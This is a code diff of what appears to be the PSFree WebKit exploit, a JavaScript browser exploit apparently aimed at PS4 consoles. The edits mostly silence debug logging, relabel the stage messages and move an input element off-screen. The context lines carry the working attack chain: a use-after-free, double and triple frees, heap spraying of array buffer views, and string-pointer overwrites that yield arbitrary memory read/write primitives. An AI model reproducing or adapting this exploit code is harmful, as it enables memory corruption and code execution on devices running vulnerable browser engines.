@@ -118,6 +118,8 @@ let view_leak = null;
 
 
 let input = document.body.appendChild(document.createElement("input"));
+input.style.position = "absolute";
+input.style.top = "-100px";
 let foo = document.body.appendChild(document.createElement("a"));
 foo.id = "foo";
 
@@ -246,7 +248,7 @@ async function setup_ar(save) {
     delete save.views;
     delete save.pop;
     gc(num_gc);
-    debug_log('setup_ar() gc done');
+    // debug_log('setup_ar() gc done');
 
     // Extra sleep if the object hasn't been collected yet, this is to allow
     // the garbage collector to preempt us. Keeping the call to gc() lowers the
@@ -263,10 +265,10 @@ async function setup_ar(save) {
             break;
         }
     }
-    debug_log(`total_sleep: ${total_sleep}`);
+    // debug_log(`total_sleep: ${total_sleep}`);
     // log to check if the garbage collector did collect PopStateEvent
     // must not log "1, 0, 0, 0, ..."
-    debug_log(view);
+    // debug_log(view);
 
     let num_spray = 0;
     while (true) {
@@ -293,10 +295,10 @@ async function setup_ar(save) {
             if (str_arr[i].length > 0xff) {
                 rstr = str_arr[i];
                 found = true;
-                debug_log('confirmed correct leaked');
-                debug_log(`str len: ${rstr.length}`);
-                debug_log(view);
-                debug_log(`read address: ${read64(view, strimpl_m_data)}`);
+                // debug_log('confirmed correct leaked');
+                // debug_log(`str len: ${rstr.length}`);
+                // debug_log(view);
+                // debug_log(`read address: ${read64(view, strimpl_m_data)}`);
                 break;
             }
         }
@@ -304,7 +306,7 @@ async function setup_ar(save) {
             continue;
         }
 
-        debug_log(`num_spray: ${num_spray}`);
+        // debug_log(`num_spray: ${num_spray}`);
         return;
     }
 }
@@ -315,7 +317,7 @@ async function double_free(save) {
     await setup_ar(save);
 
     // Spraying JSArrayBufferViews
-    debug_log('spraying views');
+    // debug_log('spraying views');
     let buffer = new ArrayBuffer(buffer_len);
     let tmp = [];
     const num_alloc = 0x10000;
@@ -330,7 +332,7 @@ async function double_free(save) {
         }
     }
     tmp = null;
-    debug_log('done spray views');
+    // debug_log('done spray views');
 
     // Force JSC ref on FastMalloc Heap
     // https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js#L151
@@ -340,7 +342,7 @@ async function double_free(save) {
         props.push({ value: view_leak_arr[i] });
     }
 
-    debug_log('start find leak');
+    // debug_log('start find leak');
     //
     // /!\
     // This part must avoid as much as possible fastMalloc allocation
@@ -392,8 +394,8 @@ async function double_free(save) {
     // Critical part ended-up here
     // /!\
     //
-    debug_log('end find leak');
-    debug_log('view addr ' + view_leak);
+    // debug_log('end find leak');
+    // debug_log('view addr ' + view_leak);
 
     let rstr_addr = read64(view, strimpl_m_data);
     write64(view, strimpl_m_data, view_leak);
@@ -402,8 +404,8 @@ async function double_free(save) {
     }
     write64(view, strimpl_m_data, rstr_addr);
     write32(view, strimpl_strlen, original_strlen);
-    debug_log('contents of JSArrayBufferView');
-    debug_log(jsview);
+    // debug_log('contents of JSArrayBufferView');
+    // debug_log(jsview);
 }
 
 function find_leaked_view(rstr, view_rstr, view_m_vector, view_arr) {
@@ -610,10 +612,10 @@ async function setup_arw(save, ssv_data) {
     }
     removeEventListener('message', onmessage);
 
-    debug_log('view contents:');
-    for (let i = 0; i < ssv_len; i += 8) {
-        debug_log(read64(view, i));
-    }
+    // debug_log('view contents:');
+    // for (let i = 0; i < ssv_len; i += 8) {
+    //     debug_log(read64(view, i));
+    // }
 
     // save SerializedScriptValue
     const copy = [];
@@ -628,13 +630,14 @@ async function setup_arw(save, ssv_data) {
 
     for (const msg of msgs) {
         if (msg.data !== '') {
-            debug_log('achieved arbitrary r/w');
+            debug_log('[+] Webkit exploit (PSFree) (achieved arbitrary r/w)');
+
 
             const u = new Uint8Array(msg.data);
-            debug_log('deserialized ArrayBuffer:');
-            for (let i = 0; i < size_view; i += 8) {
-                debug_log(read64(u, i));
-            }
+            // debug_log('deserialized ArrayBuffer:');
+            // for (let i = 0; i < size_view; i += 8) {
+            //     debug_log(read64(u, i));
+            // }
 
             const mem = new Memory(u, worker);
 
@@ -688,9 +691,9 @@ function pop(event, save) {
     } else {
         save.pop = event;
         save.ab = save.views[spray_res];
-        debug_log('ssv len: ' + ssv_len);
-        debug_log('view index: ' + spray_res);
-        debug_log(save.ab);
+        // debug_log('ssv len: ' + ssv_len);
+        // debug_log('view index: ' + spray_res);
+        // debug_log(save.ab);
     }
 }
 
@@ -699,7 +702,7 @@ function pop(event, save) {
 // event fires. The input must only be blurred by history.back(), which will
 // change the focus from the input to the foo element.
 async function get_ready() {
-    debug_log('readyState: ' + document.readyState);
+    // debug_log('readyState: ' + document.readyState);
     await new Promise((resolve, reject) => {
         if (document.readyState !== "complete") {
             document.addEventListener("DOMContentLoaded", resolve);
@@ -710,25 +713,25 @@ async function get_ready() {
 }
 
 async function run() {
-    debug_log('stage: readying');
+    debug_log('[+] Webkit exploit (PSFree) (Step 0 - Readying)');
     await get_ready();
 
-    debug_log('stage: UaF 1');
+    debug_log('[+] Webkit exploit (PSFree) (Step 1 - UAF)');
     await use_after_free(pop, s1);
 
     // we trigger the leak first because it is more likely to work
     // than if it were to happen during the second ssv smashing
     // on the ps4
-    debug_log('stage: double free');
+    debug_log('[+] Webkit exploit (PSFree) (Step 2 - Double free)');
     // * keeps setup_ar()'s total sleep even lower
     // * also helps the garbage collector scheduling for 9.xx
     await sleep(0);
     await double_free(s1);
 
-    debug_log('stage: triple free');
+    debug_log('[+] Webkit exploit (PSFree) (Step 2 - Triple free)');
     await triple_free(s1, jsview, view_leak_arr, view_leak);
 
-    clear_log();
+    // clear_log();
 
     let prim = {
         write8: function (addr, value) {
